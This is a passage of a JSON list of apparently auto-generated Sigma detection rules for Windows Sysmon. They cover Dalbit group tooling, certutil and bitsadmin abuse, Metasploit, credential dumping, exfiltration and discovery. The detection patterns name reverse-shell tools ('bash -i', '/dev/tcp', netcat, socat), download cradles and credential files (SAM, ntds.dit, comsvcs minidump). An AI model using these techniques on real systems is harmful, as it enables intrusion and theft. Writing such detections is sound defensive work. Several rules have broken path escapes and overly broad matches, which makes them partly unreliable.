        "title": "Command and Scripting Interpreter Activity by Dalbit Group",
        "description": "Detects command and scripting interpreter activity associated with the Dalbit group using tools such as At, Bitsadmin, CMD, Certutil, and MetaSploit for execution.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_at": {
            "Image|endswith": "\\at.exe"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http"
            ]
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache",
              "-verifyctl"
            ]
          },
          "selection_metasploit": {
            "CommandLine|contains": [
              "meterpreter",
              "exploit",
              "msf",
              "msfvenom"
            ]
          },
          "condition": "selection_at or selection_bitsadmin or selection_cmd or selection_certutil or selection_metasploit"
        },
        "falsepositives": [
          "Scheduled task creation using 'at.exe' by system administrators",
          "Legitimate use of 'bitsadmin.exe' for background file transfers",
          "Normal command-line usage via cmd.exe in administrative scripts",
          "Use of certutil.exe for certificate management by IT staff",
          "Metasploit framework usage in penetration testing environments"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.T1059",
          "threat-group.dalbit"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "b2a8415c-6a89-48a1-8eed-804b83071778"
      },
      {
        "title": "Detected Malware Backdoor via Suspicious Process Creation",
        "description": "Detects the presence of a backdoor by identifying suspicious process creation patterns commonly associated with APT activity and backdoor execution on Windows systems. Focuses on command-line characteristics and execution of suspicious binaries.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_suspicious_image": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe",
              "\\rundll32.exe",
              "\\regsvr32.exe"
            ],
            "CommandLine|contains": [
              "\\\\",
              "http",
              "https",
              "base64",
              "-enc",
              "/c",
              "cmd /k",
              "iex",
              "Invoke-Expression",
              "DownloadString",
              "WebClient",
              "Start-Process",
              "New-Object",
              "Shell.Application",
              "Run",
              "Execute",
              "CreateObject",
              "WScript.Shell"
            ]
          },
          "selection_suspicious_parent": {
            "ParentImage|endswith": [
              "\\explorer.exe",
              "\\winlogon.exe",
              "\\svchost.exe",
              "\\services.exe",
              "\\lsass.exe"
            ],
            "ParentCommandLine|contains": [
              "/",
              "-",
              "\\",
              "http",
              "iex",
              "cmd /k"
            ]
          },
          "selection_known_indicators": {
            "CommandLine|contains": [
              "Backdoor"
            ]
          },
          "condition": "selection_suspicious_image or selection_suspicious_parent or selection_known_indicators"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell or command-line tools",
          "Scheduled tasks executing scripts via rundll32 or mshta",
          "Software deployment tools using command-line utilities",
          "User-initiated script execution from explorer"
        ],
        "level": "high",
        "tags": [
          "attack.t1071",
          "attack.t1059",
          "attack.t1204",
          "attack.t1543",
          "attack.t1013",
          "malware.backdoor",
          "custom.apt"
        ],
        "ttp_id": "unknown",
        "technique_name": "Backdoor",
        "generation_method": "langchain",
        "id": "1f4109c7-5058-49a3-8bc2-039e9714c780"
      },
      {
        "title": "Exploitation for Client Execution via Korean Groupware Solution",
        "description": "Detects potential exploitation of a vulnerability in a Korean groupware solution for client-side execution. This rule focuses on suspicious process creation patterns that may indicate exploitation leading to arbitrary code execution.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_groupware_process": {
            "Image|contains": [
              "groupware",
              "GroupWare",
              "GROUPWARE"
            ]
          },
          "selection_suspicious_child": {
            "ParentImage|contains": [
              "groupware",
              "GroupWare",
              "GROUPWARE"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe",
              "\\rundll32.exe",
              "\\regsvr32.exe"
            ]
          },
          "selection_command_line_indicators": {
            "ParentImage|contains": [
              "groupware",
              "GroupWare",
              "GROUPWARE"
            ],
            "CommandLine|contains": [
              "\\\\",
              "http",
              "https",
              "base64",
              "-enc",
              "/c",
              "cmd /k",
              "powershell -",
              "wscript",
              "cscript"
            ]
          },
          "condition": "selection_groupware_process or (selection_suspicious_child and selection_command_line_indicators)"
        },
        "falsepositives": [
          "Legitimate administrative scripts launched from within groupware applications",
          "Automated workflows or integrations using command-line tools via groupware",
          "Software updates or patch installations initiated through groupware"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.T1203",
          "detection-rule.sigma",
          "custom.windows",
          "custom.groupware",
          "custom.korean-software"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Client Execution",
        "generation_method": "langchain",
        "id": "0be85fc8-fbb9-4130-8f57-044da7a8e83c"
      },
      {
        "title": "Server Software Vulnerability Exploitation Attempt",
        "description": "Detects potential exploitation of server software vulnerabilities by identifying suspicious process creation patterns often associated with exploitation activities, such as command shell execution from server processes or known exploitation tools.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_server_process": {
            "ParentImage|endswith": [
              "\\httpd.exe",
              "\nginx.exe",
              "\\w3wp.exe",
              "\tomcat.exe",
              "\\java.exe"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\certutil.exe",
              "\bitsadmin.exe",
              "\\msiexec.exe"
            ]
          },
          "selection_suspicious_cli": {
            "CommandLine|contains": [
              "-enc",
              "Invoke-WebRequest",
              "http://",
              "https://",
              "/c",
              "start",
              "echo",
              ">",
              ">>",
              "nc",
              "ncat",
              "telnet",
              "wget",
              "curl"
            ]
          },
          "condition": "selection_server_process and selection_suspicious_cli"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed from web server contexts",
          "Automated deployment tools running under server processes",
          "Scheduled tasks initiated by application pools for maintenance"
        ],
        "level": "high",
        "tags": [
          "attack.t1190",
          "attack.execution",
          "attack.privilege_escalation",
          "attack.lateral_movement",
          "detection.emulation_tested"
        ],
        "ttp_id": "unknown",
        "technique_name": "Server Software Vulnerability",
        "generation_method": "langchain",
        "id": "dd2ea64d-3167-4009-aebf-f0f6ff8c1d06"
      },
      {
        "title": "Remote Access Tool Configuration via FRP INI File",
        "description": "Detects the use of FRP (Fast Reverse Proxy) configuration files (.ini) which may indicate the deployment of remote access tools by threat actors such as the Dalbit group for command and control purposes.",
        "logsource": {
          "category": "file_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_frp_ini": {
            "TargetFilename|endswith": ".ini",
            "CommandLine|contains": [
              "frp",
              "frpc",
              "frps"
            ]
          },
          "selection_process_write": {
            "Image|endswith": [
              "\frpc.exe",
              "\frps.exe"
            ]
          },
          "condition": "selection_frp_ini or selection_process_write"
        },
        "falsepositives": [
          "Legitimate use of FRP by system administrators or developers for remote access or port forwarding",
          "Development or testing environments where FRP is used for tunneling services"
        ],
        "level": "high",
        "tags": [
          "attack.t1210",
          "attack.command-and-control",
          "custom.frp",
          "custom.remote-access",
          "custom.dalbit"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Access Tools",
        "generation_method": "langchain",
        "id": "422a931a-f258-4f1c-904d-96cd0d801d18"
      },
      {
        "title": "Detected Malware Downloader via Command Line Tool",
        "description": "Detects the use of command line tools commonly associated with downloader malware activity by analyzing process creation events for suspicious command line patterns and child processes.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "-enc",
              "Out-File",
              "System.Net.WebClient",
              "IEX",
              "DownloadString",
              "DownloadFile"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache",
              "-f"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http"
            ]
          },
          "selection_curl": {
            "Image|endswith": "\\curl.exe",
            "CommandLine|contains": [
              "http",
              "-o"
            ]
          },
          "selection_wget": {
            "Image|endswith": "\\wget.exe",
            "CommandLine|contains": [
              "http",
              "-O"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_curl or selection_wget"
        },
        "falsepositives": [
          "Legitimate administrative scripts using command line tools for file download or automation",
          "Software deployment tools utilizing bitsadmin or certutil for updates",
          "PowerShell scripts used in configuration management (e.g., Ansible, Chef)"
        ],
        "level": "high",
        "tags": [
          "attack.initial-access",
          "attack.t1105",
          "malware.downloader",
          "custom.sigma-rule"
        ],
        "ttp_id": "unknown",
        "technique_name": "Downloader",
        "generation_method": "langchain",
        "id": "afc27d9a-59ec-4ad5-949a-bcc1abe5b78f"
      },
      {
        "title": "Create or Modify System Process via Command Line Tools",
        "description": "Detects creation or modification of system processes using command-line utilities commonly associated with persistence activities. This rule identifies suspicious process creation patterns involving tools like sc.exe, powershell.exe, and wmic.exe that may indicate adversary attempts to establish persistence through system-level services or processes.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc_create": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "create"
          },
          "selection_sc_config": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "config"
          },
          "selection_powershell_service": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "New-Service",
              "Set-Service",
              "-Exec",
              "-PathName"
            ]
          },
          "selection_wmic_service": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "service",
              "create",
              "config"
            ]
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": [
              "create",
              "/RU SYSTEM",
              "/RL HIGHEST"
            ]
          },
          "condition": "selection_sc_create or selection_sc_config or selection_powershell_service or selection_wmic_service or selection_schtasks"
        },
        "falsepositives": [
          "Legitimate system administration activities using sc.exe, wmic.exe, or PowerShell to manage Windows services",
          "Scheduled task creation by IT management tools",
          "Automated patch management systems modifying service configurations"
        ],
        "level": "high",
        "tags": [
          "attack.t1053",
          "attack.t1543",
          "attack.t1126",
          "attack.t1037",
          "attack.g0004",
          "detection.rule.quality.high",
          "use-case.persistence"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "90e8f8e4-5d00-4e96-9de4-2364efc8729a"
      },
      {
        "title": "Command and Scripting Interpreter - CMD Execution",
        "description": "Detects execution of cmd.exe as part of command and scripting interpreter technique for execution",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\cmd.exe"
          },
          "selection_command_line_args": {
            "CommandLine|contains": [
              "/c",
              "/k",
              ">",
              ">>",
              "|",
              "&",
              "^",
              "\"\"",
              "start",
              "echo"
            ]
          },
          "condition": "selection and selection_command_line_args"
        },
        "falsepositives": [
          "Legitimate administrative use of cmd.exe via scripts or manual execution",
          "Scheduled tasks invoking cmd.exe for system maintenance",
          "Software installation routines that use command-line interfaces"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.T1059",
          "custom.sigma",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "ba01febb-e92b-4942-8884-c6c3da33a2b7"
      },
      {
        "title": "Detected Use of Bitsadmin for Execution",
        "description": "Detects the execution of bitsadmin.exe which can be used by adversaries to download files, execute programs, or perform other malicious activities as part of execution tactics.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "bitsadmin"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative use of bitsadmin.exe for background file transfers",
          "Automated scripts or scheduled tasks using bitsadmin for software updates"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1197",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Utilities",
        "generation_method": "langchain",
        "id": "d8be6cb7-8e22-47ea-8bdf-b248674a24fd"
      },
      {
        "title": "Detected Use of Certutil for Execution",
        "description": "Detects the use of certutil.exe, a Windows system utility, which can be abused for malicious purposes such as downloading files, decoding data, or bypassing defenses. This rule identifies process creation events involving certutil.exe with common command-line arguments indicative of abuse.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-urlcache",
              "-verifyctl",
              "-addstore",
              "-decode",
              "-decodehex",
              "-encode",
              "-split",
              "-retrieve",
              "-f"
            ]
          },
          "condition": "selection_certutil"
        },
        "falsepositives": [
          "Legitimate administrative use of certutil.exe for certificate management, troubleshooting, or software deployment",
          "Automated patch management or monitoring tools that use certutil in scripts"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1105",
          "attack.t1218",
          "attack.t1555.004",
          "custom.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Utilities",
        "generation_method": "langchain",
        "id": "2198544a-0942-4b97-b993-07ee86cc6007"
      },
      {
        "title": "Scheduled Task Creation or Execution via at.exe",
        "description": "Detects the use of at.exe for scheduling or executing tasks, which is commonly abused by adversaries for execution and persistence. This technique is associated with MITRE ATT&CK T1053.002 (Scheduled Task/Job: at).",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\at.exe"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative use of at.exe in legacy environments",
          "Scheduled task management via automated scripts in controlled scenarios"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1053.002",
          "custom.windows",
          "custom.suspicious-tool-use"
        ],
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task",
        "generation_method": "langchain",
        "id": "20a883b3-e877-4a3d-b607-304f7afd4327"
      },
      {
        "title": "Exploitation for Client Execution via MetaSploit",
        "description": "Detects the use of MetaSploit as observed in exploitation activities for client execution. This rule focuses on behavioral indicators associated with MetaSploit payloads and execution patterns.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_metasploit_process": {
            "Image|endswith": [
              "\rundll32.exe",
              "\\mshta.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ],
            "CommandLine|contains": [
              "msf",
              "meterpreter",
              "exploit",
              "payload"
            ]
          },
          "selection_metasploit_parent": {
            "ParentImage|endswith": [
              "\\msfconsole",
              "\\msfvenom"
            ],
            "Image|endswith": [
              "\rundll32.exe",
              "\\mshta.exe",
              "\\powershell.exe",
              "\\cmd.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          "condition": "selection_metasploit_process or selection_metasploit_parent"
        },
        "falsepositives": [
          "Legitimate penetration testing activities using MetaSploit framework",
          "Security tools or scripts that include 'msf', 'meterpreter', 'exploit', or 'payload' in command lines for documentation or testing purposes"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.T1203",
          "attack.T1106",
          "attack.T1059",
          "threat-actor.metasploit"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Client Execution",
        "generation_method": "langchain",
        "id": "ef8b9b42-52aa-468c-a4cb-58f2cb722ded"
      },
      {
        "title": "Application Layer Protocol Activity via NLP Pattern Matching",
        "description": "Detects Application Layer Protocol activity by identifying suspicious command-line patterns indicative of data exfiltration or command and control using common tools.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "-enc",
              "Out-File",
              "System.Net.WebClient",
              "Invoke-RestMethod",
              "IEX"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http"
            ]
          },
          "selection_wget_curl": {
            "Image|endswith": [
              "\\wget.exe",
              "\\curl.exe"
            ],
            "CommandLine|contains": [
              "http",
              "https",
              "-O",
              "--output"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_wget_curl"
        },
        "falsepositives": [
          "Legitimate administrative scripts using command-line tools for file transfer or automation",
          "Software deployment processes using bitsadmin or certutil",
          "PowerShell scripts using web requests for API calls or health checks"
        ],
        "level": "high",
        "tags": [
          "attack.t1071",
          "attack.command-and-control",
          "custom.detection-method/nlp",
          "custom.technique/application-layer-protocol"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "generation_method": "langchain",
        "id": "cbac0f24-312d-4d99-909d-a6682649f5d1"
      },
      {
        "title": "Command and Scripting Interpreter Activity via Behavioral Patterns",
        "description": "Detected Command and Scripting Interpreter activity using behavioral command-line patterns commonly associated with adversary execution. Detection based on known scripting interpreter execution chains, argument usage, and process invocation patterns.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell_encoded": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-encodedcommand"
            ]
          },
          "selection_powershell_bypass": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-exec",
              "-executionpolicy",
              "bypass",
              "unrestricted"
            ]
          },
          "selection_cmd_scripting": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "echo",
              ">",
              "^|",
              "^"
            ]
          },
          "selection_wscript_cscript": {
            "Image|endswith": "\\wscript.exe",
            "CommandLine|contains": [
              ".js",
              ".vbs",
              "\\\\"
            ]
          },
          "selection_bash_scripting": {
            "Image|endswith": "\\bash",
            "CommandLine|contains": [
              "-c",
              "/dev/tcp"
            ]
          },
          "selection_python_download": {
            "Image|endswith": "\\python.exe",
            "CommandLine|contains": [
              "urllib",
              "requests",
              "subprocess.call",
              "os.system"
            ]
          },
          "condition": "selection_powershell_encoded or selection_powershell_bypass or selection_cmd_scripting or selection_wscript_cscript or selection_bash_scripting or selection_python_download"
        },
        "falsepositives": [
          "Legitimate administrative scripting using PowerShell, cmd, or scripting interpreters",
          "Software deployment or patching tools invoking scripts",
          "User running local development scripts (e.g., Python, Bash)",
          "Scheduled tasks executing backup or maintenance scripts"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "detection.emulation",
          "use-case.command-interpreter"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "3f0da8c0-a933-4743-8030-2a5e8f7610ac"
      },
      {
        "title": "Exfiltration Over C2 Channel via Command Line Activity",
        "description": "Detects Exfiltration Over C2 Channel by identifying suspicious command-line patterns commonly used to exfiltrate data through standard tools like certutil, bitsadmin, PowerShell, or cmd.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "-enc",
              "Out-File",
              "System.Net.WebClient",
              "UploadString",
              "DownloadString"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache",
              "-f"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin"
        },
        "falsepositives": [
          "Legitimate administrative scripts using certutil or bitsadmin for patch management",
          "PowerShell scripts using WebRequest for software updates",
          "Automated backup or sync scripts using command-line redirection"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.T1041",
          "detection.emulation",
          "custom.windows",
          "custom.command-line-abuse"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "generation_method": "langchain",
        "id": "b5eef6f0-3ea2-4d77-88ad-0ef01c1674be"
      },
      {
        "title": "Exploit Public-Facing Application via NLP Pattern Matching",
        "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_web_server": {
            "ParentImage|endswith": [
              "\\httpd.exe",
              "\nginx.exe",
              "\\w3wp.exe"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\powershell_ise.exe",
              "\\cscript.exe",
              "\\wscript.exe",
              "\\mshta.exe",
              "\rundll32.exe",
              "\regsvr32.exe",
              "\\wmic.exe",
              "\\certutil.exe",
              "\bitsadmin.exe"
            ],
            "CommandLine|contains": [
              "-enc",
              "/c",
              "/k",
              "iex",
              "Invoke-Expression",
              "Start-Process",
              "New-Object",
              "Net.WebClient",
              "DownloadString",
              "DownloadFile",
              "ShellExecute",
              "Run",
              "cmd /k",
              "cmd /c",
              "http",
              "https",
              "80",
              "443",
              "8080",
              "8443"
            ]
          },
          "selection_generic_exploit": {
            "Image|endswith": [
              "\\python.exe",
              "\\perl.exe",
              "\\php.exe",
              "\\java.exe",
              "\\javaw.exe"
            ],
            "CommandLine|contains": [
              "reverse",
              "shell",
              "bind",
              "payload",
              "exploit",
              "attack",
              "connect",
              "nc",
              "netcat",
              "socat",
              "bash -i",
              "/bin/sh",
              "powershell -enc",
              "msfvenom"
            ]
          },
          "condition": "selection_web_server or selection_generic_exploit"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed from web server processes",
          "Automated deployment tools interacting with web server binaries",
          "Security scanning tools simulating exploit attempts",
          "Penetration testing activities",
          "Development debugging involving local web server and scripting tools"
        ],
        "level": "high",
        "tags": [
          "attack.initial-access",
          "attack.T1190",
          "custom.detection-quality:high",
          "custom.use-case:threat-detection",
          "custom.domain:enterprise"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "generation_method": "langchain",
        "id": "de634769-0ad0-4dc7-9efd-c4b2451a4dae"
      },
      {
        "title": "Windows Management Instrumentation (WMI) Execution via Command Line",
        "description": "Detects suspicious Windows Management Instrumentation (WMI) execution patterns via command line tools such as wmic.exe or WMI queries executed through scripting engines. Based on behavioral indicators of WMI abuse for execution.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe"
          },
          "selection_wmi_query": {
            "CommandLine|contains": [
              "\\root\\cimv2",
              "SELECT * FROM",
              "Win32_Process",
              "Create(\"",
              "CommandLine =\""
            ]
          },
          "selection_script_host": {
            "ParentImage|endswith": [
              "\\wmic.exe",
              "\\WmiPrvSE.exe"
            ]
          },
          "condition": "selection_wmic or (selection_wmi_query and not selection_script_host)"
        },
        "falsepositives": [
          "Legitimate system administration using wmic.exe or WMI queries",
          "Automated management scripts using WMI for inventory or monitoring",
          "Software deployment tools leveraging WMI"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1047",
          "detection.emulation",
          "windows.wmi.abuse"
        ],
        "ttp_id": "unknown",
        "technique_name": "Windows Management Instrumentation",
        "generation_method": "langchain",
        "id": "c15b8683-9112-4956-b787-22f720eab586"
      },
      {
        "title": "OS Credential Dumping via NLP Pattern Matching",
        "description": "Detected OS Credential Dumping activity via NLP pattern matching on process command line arguments commonly associated with credential dumping tools and techniques.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_lsass_access": {
            "Image|endswith": [
              "\\lsass.exe",
              "\\taskmgr.exe",
              "\\procdump.exe",
              "\\comsvcs.dll"
            ],
            "CommandLine|contains": [
              "minidump",
              "comsvcs",
              "procdump",
              "tasklist",
              "ntdsutil"
            ]
          },
          "selection_suspicious_parent": {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe",
              "\\rundll32.exe",
              "\\regsvr32.exe"
            ],
            "CommandLine|contains": [
              "minidump",
              "comsvcs",
              "procdump",
              "ntdsutil"
            ]
          },
          "selection_dump_artifact": {
            "CommandLine|contains": [
              "/m",
              "-ma",
              "-mp",
              "/all",
              "system32\\config\\SAM",
              "ntds.dit",
              "SECURITY",
              "SYSTEM"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\reg.exe",
              "\\esentutl.exe",
              "\\ntdsutil.exe",
              "\\procdump.exe"
            ]
          },
          "condition": "selection_lsass_access or selection_suspicious_parent or selection_dump_artifact"
        },
        "falsepositives": [
          "Legitimate administrative use of ntdsutil or esentutl for backup/restore operations",
          "System diagnostics using tasklist or procdump by IT support",
          "Scheduled tasks that enumerate running processes"
        ],
        "level": "high",
        "tags": [
          "attack.credential_access",
          "attack.t1003",
          "detection.os_credential_dumping",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "OS Credential Dumping",
        "generation_method": "langchain",
        "id": "f2f48975-4051-4c1c-9a8c-681e0c91beba"
      },
      {
        "title": "Network Service Discovery via NLP Pattern Matching",
        "description": "Detected Network Service Discovery activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_net_view": {
            "Image|endswith": "\\net.exe",
            "CommandLine|contains": [
              "view",
              "/domain",
              "/all",
              "/users",
              "/groups"
            ]
          },
          "selection_nslookup": {
            "Image|endswith": "\\nslookup.exe",
            "CommandLine|contains": [
              "-type=",
              "server",
              "set type="
            ]
          },
          "selection_nbtstat": {
            "Image|endswith": "\\nbtstat.exe",
            "CommandLine|contains": [
              "-a",
              "-A",
              "-r",
              "-R"
            ]
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "/node:",
              "computersystem",
              "netlogin",
              "netclient",
              "service",
              "process"
            ]
          },
          "selection_smb": {
            "CommandLine|contains": [
              "\\\\\\",
              "IPC$",
              "C$",
              "ADMIN$"
            ]
          },
          "condition": "selection_net_view or selection_nslookup or selection_nbtstat or selection_wmic or selection_smb"
        },
        "falsepositives": [
          "Legitimate administrative activity using network discovery tools",
          "Automated IT management and monitoring scripts",
          "Domain enumeration during normal user logon by group policy scripts",
          "Penetration testing or red team exercises"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.T1049",
          "attack.T1018",
          "attack.T1135",
          "attack.T1069",
          "custom.windows",
          "custom.sysmon",
          "custom.network_service_discovery"
        ],
        "ttp_id": "unknown",
        "technique_name": "Network Service Discovery",
        "generation_method": "langchain",
        "id": "d5b72332-c8be-4e2f-a7a3-ce480d0a6a0c"
      },
      {
        "title": "Archive Collected Data via Command Line Tools",
        "description": "Detects archiving of collected data using common command-line tools such as PowerShell Compress-Archive, 7-Zip, or Windows built-in tar/zip utilities. Based on behavioral patterns observed in data staging activities during collection.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Compress-Archive",
              "Start-Process 7z",
              "tar -cf",
              "zip -r"
            ]
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "7z a",
              "tar -cf",
              "zip -r",
              "makecab"
            ]
          },
          "selection_7z": {
            "Image|endswith": "\\7z.exe",
            "CommandLine|contains": "a"
          },
          "selection_tar": {
            "Image|endswith": "\\tar.exe",
            "CommandLine|contains": "-cf"
          },
          "selection_zip": {
            "Image|endswith": "\\zip.exe",
            "CommandLine|contains": "-r"
          },
          "condition": "selection_powershell or selection_cmd or selection_7z or selection_tar or selection_zip"
        },
        "falsepositives": [
          "Legitimate administrative use of archiving tools for backup or deployment",
          "Development workflows involving command-line compression",
          "Automated scripts using 7z/tar/zip for packaging"
        ],
        "level": "high",
        "tags": [
          "attack.collection",
          "attack.T1560",
          "detection.emulation_tested"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "eae662db-b034-4600-b6aa-add381110be0"
      },
      {
        "title": "Scheduled Task Creation via Command Line Tools",
        "description": "Detects creation of scheduled tasks using command line tools such as schtasks.exe or at.exe, commonly abused for persistence. Detection based on command-line arguments associated with task creation.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_schtasks_create": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": [
              "/create",
              "-create"
            ]
          },
          "selection_at": {
